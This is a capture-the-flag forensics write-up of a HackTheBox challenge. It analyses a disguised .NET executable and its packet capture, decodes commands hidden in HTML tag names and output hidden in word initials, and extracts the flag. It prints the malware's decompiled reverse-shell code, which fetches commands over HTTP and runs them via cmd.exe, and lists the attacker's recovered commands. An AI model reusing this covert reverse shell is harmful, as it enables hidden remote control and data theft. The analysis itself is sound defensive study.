---
layout: post
title: "FishyHTTP"
date: 2026-09-09
categories: [Forensics]
platform: HackTheBox
tags: []
excerpt: "Analyzing a bundled .NET executable and decoding commands hidden in HTML tags and command output disguised as words in HTTP traffic."
---

## Analysis

In this Forensics challenge, we are given a Windows executable and a packet capture:

```bash
$ file smphost.exe sustraffic.pcapng
smphost.exe:       PE32+ executable (console) x86-64, for MS Windows, 10 sections
sustraffic.pcapng: pcapng capture file - version 1.0
```

I started by opening the capture in Wireshark and filtering for HTTP requests:

```text
http.request
```

The traffic shows repeated requests from `10.142.0.4` to `10.142.0.3`. The client requests `/`, then sends a POST request to `/submit_feedback`.

We can also list these requests with `tshark`:

```bash
$ tshark -r sustraffic.pcapng -Y http.request -T fields \
    -e frame.number -e ip.src -e ip.dst \
    -e http.request.method -e http.request.uri
4	10.142.0.4	10.142.0.3	GET	/
16	10.142.0.4	10.142.0.3	POST	/submit_feedback
26	10.142.0.4	10.142.0.3	GET	/
41	10.142.0.4	10.142.0.3	POST	/submit_feedback
54	10.142.0.4	10.142.0.3	GET	/
67	10.142.0.4	10.142.0.3	POST	/submit_feedback
79	10.142.0.4	10.142.0.3	GET	/
91	10.142.0.4	10.142.0.3	POST	/submit_feedback
101	10.142.0.4	10.142.0.3	GET	/
```

Following the TCP streams reveals HTML pages containing random words. The POST requests contain two form fields: `Name`, set to `Test User`, and `feedback`, containing another sequence of words.

The repeated pattern suggested that the executable could explain how this traffic was generated.

## Executable

The executable is around 67 MB, so I checked its strings before trying to run it:

```bash
$ strings -a smphost.exe | rg 'singlefilehost\.pdb|MyProject\.pdb'
D:\a\_work\1\s\artifacts\obj\coreclr\windows.x64.Release\Corehost.Static\singlefilehost.pdb
D:\Work\2. My work\HTB challenge\Sherlock\testdot\MyProject\obj\Release\net8.0\win-x64\MyProject.pdb
```

These paths point to a .NET application. Opening `smphost.exe` in ILSpy confirms that it is a single-file bundle:

```text
// File format: .NET bundle 6.0

Entries:
 MyProject.dll (15872 bytes)
 MyProject.runtimeconfig.json (371 bytes)
 Microsoft.CSharp.dll (1005840 bytes)
 Microsoft.VisualBasic.Core.dll (1247504 bytes)
 ...
```

The bundle version `6.0` describes the packaging format. The application itself targets .NET 8, as shown by the build path and runtime configuration.

Most of the bundle consists of .NET libraries. The interesting entry is `MyProject.dll`, which is only 15,872 bytes.

In ILSpy, the bundle's contents list is only the container view. Expand the bundle in the assembly tree and open `MyProject.dll`. If using an extracted copy, open that DLL directly with **File → Open**. Then expand `MyNamespace` and inspect `Program.Main`.

The program expects an IP address and port, which it uses to build an HTTP URL:

```csharp
string value = args[0];
string value2 = args[1];
string url = $"http://{value}:{value2}/";
```

Inside `Main`, three local functions handle the communication: `SendRequest`, `DecodeData`, and `EncodeData`.

The relevant part of `SendRequest` is:

```csharp
HttpResponseMessage obj = await client.GetAsync(url);
obj.EnsureSuccessStatusCode();
string text3 = DecodeData(await obj.Content.ReadAsStringAsync());

using Process process = new Process();
process.StartInfo.FileName = "cmd.exe";
process.StartInfo.Arguments = "/c " + text3;
process.StartInfo.RedirectStandardOutput = true;
process.StartInfo.UseShellExecute = false;
process.Start();
process.WaitForExit();
string text4 = process.StandardOutput.ReadToEnd();
```

The HTML response contains a command. The program decodes it, executes it through `cmd.exe /c`, and captures standard output.

It then passes the output through `EncodeData` and sends it back in the `feedback` field. If standard output is empty, it sends the string `succeed` instead.

This is an HTTP reverse shell. We can recover the commands and their output directly from the capture without executing the sample.

## Decoding Commands

`DecodeData` extracts the content between `<body>` and `</body>`, then searches for opening HTML tags:

```csharp
new Regex("<(\\w+)[\\s>]", RegexOptions.Singleline)
```

For each tag except `li`, it appends a value from the `tagHex` dictionary. The resulting string is converted from hexadecimal bytes to ASCII.

The dictionary is initialized outside `Main`, in the static constructor. I recovered these values:

| HTML tag | Hex digit | HTML tag | Hex digit |
| --- | --- | --- | --- |
| `cite` | `0` | `div` | `8` |
| `h1` | `1` | `span` | `9` |
| `p` | `2` | `label` | `a` |
| `a` | `3` | `textarea` | `b` |
| `img` | `4` | `nav` | `c` |
| `ul` | `5` | `b` | `d` |
| `ol` | `6` | `i` | `e` |
| `button` | `7` | `blockquote` | `f` |

The words inside the tags do not affect command decoding. Only the opening tag names matter.

For example, the first HTML response is in frame 9. After skipping `li`, its tags are:

```text
button button ol div ol blockquote ol h1 ol b ol span
```

Using the dictionary gives:

```text
7 7 6 8 6 f 6 1 6 d 6 9
```

Pairing the digits and decoding the bytes reveals the first command:

```python
print(bytes.fromhex("77686f616d69").decode("ascii"))
```

Output:

```text
whoami
```

There is one detail in the C# code that matters when reproducing it on Linux. It splits the body using `Environment.NewLine` and processes the first non-empty result. On Windows, that separator is `\r\n`, while the captured HTML uses `\n` between tags. The entire body therefore remains in the first result. Using Python's `splitlines()[0]` would incorrectly keep only the first tag.

## Decoding Command Output

The output uses a different encoding. `Main` decodes a large Base64 string into a word list, then groups the words by their first letter.

`EncodeData` first Base64-encodes the command output:

```csharp
string text3 = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
```

For each letter in that Base64 string, it chooses a random word suffix from the corresponding group. It preserves the original character and adds the suffix, followed by a space. Digits and symbols are written directly, also followed by a space.

To reverse this, we only need the first character of each word. The random suffixes and the original word list are unnecessary.

After URL-decoding the first POST request's `feedback` field, we get:

```text
duck 2 lock unicorn Zebra Ghost 9 3 car yak 1 pineapple bird notebook Nut 0 Yak Wand 5 jigsaw Xylophone Helicopter Bottle hat astronaut 2 Necklace 5 Yawn mushroom Video yak Yodel microphone 9 0 Door Question onion =
```

Taking the first character of each token gives:

```text
d2luZG93cy1pbnN0YW5jXHBha2N5YmVyYm90DQo=
```

Base64-decoding it reveals the response to `whoami`:

```text
windows-instanc\pakcyberbot
```

Uppercase and lowercase must be preserved because Base64 is case-sensitive. The form body also needs to be URL-decoded first: a form-encoded `+` represents a space, while `%2B` represents a literal `+` in the Base64 data.

## Extraction

With both encodings understood, I used Python and `tshark` to decode the HTTP bodies automatically.

Save this as `decode_traffic.py` alongside the capture:

```python
import base64
from pathlib import Path
import re
import subprocess
from urllib.parse import parse_qs

tag_hex = dict(zip(
    ["cite", "h1", "p", "a", "img", "ul", "ol", "button",
     "div", "span", "label", "textarea", "nav", "b", "i", "blockquote"],
    "0123456789abcdef"
))


def decode_command(html):
    match = re.search(r"<body>(.*?)</body>", html, re.S)
    if match is None:
        return None

    # Match the Windows program's separator, preserving lone LF characters.
    body = next(part for part in match[1].split("\r\n") if part)
    tags = re.findall(r"<(\w+)[\s>]", body)
    encoded = "".join(tag_hex[tag] for tag in tags if tag != "li")
    return bytes.fromhex(encoded).decode("ascii")


def decode_output(body):
    feedback = parse_qs(body)["feedback"][0]
    encoded = "".join(word[0] for word in feedback.split())
    return base64.b64decode(encoded, validate=True).decode("utf-8")


result = subprocess.run([
    "tshark", "-r", "sustraffic.pcapng", "-Y", "http.file_data",
    "-T", "fields", "-e", "frame.number", "-e", "tcp.stream",
    "-e", "http.request.method", "-e", "http.file_data"
], capture_output=True, text=True, check=True)

transcript = []

for row in result.stdout.splitlines():
    frame, stream, method, body_hex = row.split("\t")
    body = bytes.fromhex(body_hex).decode("utf-8")

    if method == "POST":
        kind = "output"
        decoded = decode_output(body)
    else:
        kind = "command"
        decoded = decode_command(body)
        if decoded is None:
            continue

    transcript.append(f"Frame {frame} | TCP stream {stream} | {kind}\n{decoded}\n")

text = "\n".join(transcript)
Path("transcript.txt").write_text(text)
print(text)
```

Run it with:

```bash
$ python3 decode_traffic.py
```

The script reads `http.file_data`, which contains the HTTP body as hexadecimal bytes. It decodes POST form data as command output and HTML bodies as commands. The plain-text acknowledgements to the POST requests have no `<body>` element, so they are skipped.

The recovered commands are:

```text
Frame 9 | TCP stream 0 | command
whoami

Frame 31 | TCP stream 2 | command
systeminfo

Frame 60 | TCP stream 4 | command
dir && cd \Users\pakcyberbot\Documents\ && type HTB{Th4ts_d07n37_

Frame 84 | TCP stream 6 | command
dir && cd \Users\pakcyberbot && echo 'you are hacked' > notes.txt
```

The `systeminfo` output identifies the host as `WINDOWS-INSTANC`, running Windows Server 2016 Datacenter on Google Compute Engine.

The interesting command is in frame 60. It changes to the user's Documents directory and reads a file whose name contains the first flag fragment:

```text
HTB{Th4ts_d07n37_
```

The corresponding output is sent in frame 67:

```text
 Volume in drive C has no label.
 Volume Serial Number is A079-ADFB

 Directory of C:\Temp

05/07/2024  09:22 AM    <DIR>          .
05/07/2024  09:22 AM    <DIR>          ..
05/07/2024  07:23 AM        67,515,744 smphost.exe
               1 File(s)     67,515,744 bytes
               2 Dir(s)  29,638,520,832 bytes free
'h77P_s73417hy_revSHELL}'
```

The directory listing comes from `dir`, and the last line is the output of `type`. Removing the surrounding quotes and joining the two fragments gives the flag.

## Flag

`HTB{Th4ts_d07n37_h77P_s73417hy_revSHELL}`
